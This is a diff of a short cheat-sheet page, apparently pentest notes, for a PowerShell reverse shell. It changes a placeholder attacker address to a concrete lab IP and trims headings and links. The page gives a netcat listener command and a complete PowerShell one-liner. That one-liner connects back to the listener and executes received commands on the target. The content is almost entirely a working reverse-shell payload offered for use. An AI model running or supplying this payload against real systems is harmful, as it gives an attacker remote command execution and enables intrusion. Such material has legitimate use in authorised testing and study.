@@ -6,18 +6,16 @@
 
 ---
 
-PowerShell reverse shell. Listener on the attacker, one-liner on the target.
-
-## Source machine
+## Source Machine
 
 ```bash
 nc -lvnp 443
 ```
 
-## Target machine
+## Target Machine
 
 ```ps1
-$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.79',443);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
@@ -31,9 +29,4 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-See [bash](../bash.md) for more.
-
-## Resources
-
-- [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell) — more PS payloads
-- [revshells.com](https://www.revshells.com/) — generated variants
+Refer ./bash.md for more
